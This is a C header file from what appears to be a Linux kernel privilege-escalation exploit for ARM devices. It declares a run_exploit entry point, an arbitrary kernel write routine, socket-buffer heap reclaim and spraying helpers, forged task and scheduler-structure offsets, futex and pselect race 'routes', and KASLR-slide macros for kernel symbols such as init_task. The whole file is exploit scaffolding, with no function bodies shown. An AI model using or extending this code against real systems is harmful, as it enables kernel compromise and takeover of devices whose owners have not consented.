#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE
#define __ARM 1

#include "offset.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"
#include "../../general/gl_log.h"

/* Standard log library: override the vendored pr_* macros after utils.h. */
#undef pr_info
#undef pr_success
#undef pr_warning
#undef pr_error
#define pr_verbose(fmt, ...) \
  gl_log_write(GL_LOG_VERBOSE, __FILE__, __LINE__, fmt, ##__VA_ARGS__)
#define pr_debug(fmt, ...) \
  gl_log_write(GL_LOG_DEBUG, __FILE__, __LINE__, fmt, ##__VA_ARGS__)
#define pr_info(fmt, ...) \
  gl_log_write(GL_LOG_INFO, __FILE__, __LINE__, fmt, ##__VA_ARGS__)
#define pr_success(fmt, ...) \
  gl_log_write(GL_LOG_INFO, __FILE__, __LINE__, fmt, ##__VA_ARGS__)
#define pr_warning(fmt, ...) \
  gl_log_write(GL_LOG_WARN, __FILE__, __LINE__, fmt, ##__VA_ARGS__)
#define pr_error(fmt, ...) do { \
  gl_log_write(GL_LOG_ERROR, __FILE__, __LINE__, fmt, ##__VA_ARGS__); \
  exit(-1); \
} while (0)

#define SKB_DATA_DELTA (-0xe80LL)
#define MM_STRUCT_SZ 0x500

/* mm_struct stride; 0 uses MM_STRUCT_SZ above. */
#define mm_struct_sz() (t && t->mm_struct_sz ? t->mm_struct_sz : MM_STRUCT_SZ)

#define MM_ORDER 3
#define MM_PARTIALS 5
struct Glk43499Config;
struct Glk43499Target;
#define CORE(s) ((s)->config.main_cpu)
#define CONSUMER_CORE(s) ((s)->config.consumer_cpu)
#define kernelsnitch_collisions() \
  (t && t->kernelsnitch_collisions ? t->kernelsnitch_collisions : 4)

#define SKB_RECLAIM_SENDS 4
#define FOPS_TABLE_OFF FOPS_OFF
#define SKB_FRAG_BIAS 0

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 140
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
#define FAKE_TASK_UCLAMP_OFF 0x358
#define FAKE_UCLAMP_ACTIVE_BIT 16
#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
#define FAKE_UCLAMP_MAX_ACTIVE \
  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))

#define TASK_COMM_LEN 16


#define PSELECT_ENTER_DELAY_USEC 50000
/* select() timeout defaults; the compact route overrides both. */
#ifndef PSELECT_TIMEOUT_SEC
#define PSELECT_TIMEOUT_SEC 0
#endif
#ifndef PSELECT_TIMEOUT_USEC
#define PSELECT_TIMEOUT_USEC 200000
#endif
#define SLIDE_NFULNL_LOGGER \
  data_addr(&s->target, SLIDE_NFULNL_LOGGER_IMAGE)
#define SLIDE_LOGGERS_0_1 data_addr(&s->target, SLIDE_LOGGERS_0_1_IMAGE)
#define SLIDE_RANDOM_BOOT_ID_DATA \
  data_addr(&s->target, SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
#define SLIDE_INIT_TASK data_addr(&s->target, SLIDE_INIT_TASK_IMAGE)
#define SLIDE_ROOT_TASK_GROUP \
  data_addr(&s->target, SLIDE_ROOT_TASK_GROUP_IMAGE)
#define SLIDE_SYSCTL_BOOTID data_addr(&s->target, SLIDE_SYSCTL_BOOTID_IMAGE)

struct kernelsnitch_shared_state;
struct Glk43499Session;
struct GlkWriteRequest;

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};


int run_exploit(struct Glk43499Session *s);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(struct Glk43499Session *s);
void disable_rseq_for_thread(void);
void init_p0_profile(struct Glk43499Target *target);
struct kernel_offsets;
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
uintptr_t p0_data_alias(const struct Glk43499Target *target,
                        uintptr_t image_addr);
uintptr_t data_addr(const struct Glk43499Target *target, uintptr_t image_addr);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);
pid_t clone_child(int core);
pid_t clone_leak_child(struct Glk43499Session *s);
int open_memfd(pid_t child);
void kill_child(pid_t child);
void close_reclaim_sockets(struct Glk43499Session *s);
int quarantine_reclaim_sockets(struct Glk43499Session *s);
void release_quarantined_reclaim_sockets(struct Glk43499Session *s);
int stash_prebuilt_page(struct Glk43499Session *s);
int activate_prebuilt_page(struct Glk43499Session *s);
void discard_prebuilt_page(struct Glk43499Session *s);
void close_ctx_memfds(struct mm_ctx *ctx);
void free_ctx_storage(struct mm_ctx *ctx);
void cleanup_page_prepare_state(struct Glk43499Session *s);
int clone_memfd(void);
void prepare_ctxs(struct Glk43499Session *s);
int prepare_skb_payload(struct Glk43499Session *s,
                        const struct GlkWriteRequest *req, uintptr_t base);
uintptr_t prepare_kernel_page(struct Glk43499Session *s,
                              const struct GlkWriteRequest *req);
uintptr_t prepare_good_kernel_page(struct Glk43499Session *s,
                                   const struct GlkWriteRequest *req);

void fdset_put_word(fd_set *set, int word, uint64_t value);
uint64_t fdset_get_word(const fd_set *set, int word);
int tcp_route_selected(const struct kernel_offsets *t, int tcp_route);
int kernel5_route_selected(const struct kernel_offsets *t);
int open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd,
    int nfds);
void reserve_standard_io(int backup_fd[3], int nfds);
void prepare_pselect_fdsets(struct Glk43499Session *s,
                            const struct GlkWriteRequest *req, fd_set *in,
                            fd_set *out, fd_set *ex);
void do_pselect_fake_lock_route(struct Glk43499Session *s,
                                const struct GlkWriteRequest *req);
void do_tcp_fake_lock_route(struct Glk43499Session *s,
                            const struct GlkWriteRequest *req);
void do_kernel5_fake_lock_route(struct Glk43499Session *s,
                                const struct GlkWriteRequest *req);
int kernel5_resident_start(struct Glk43499Session *s);
int kernel5_resident_write(struct Glk43499Session *s, uintptr_t target,
                           uintptr_t value);
void kernel5_resident_stop(struct Glk43499Session *s);
void reset_main_route_state(struct Glk43499Session *s);
int run_main_route_threads(struct Glk43499Session *s,
                           const struct GlkWriteRequest *req);
int run_exploit(struct Glk43499Session *s);

#include "runtime_struct_offsets.h"

#endif
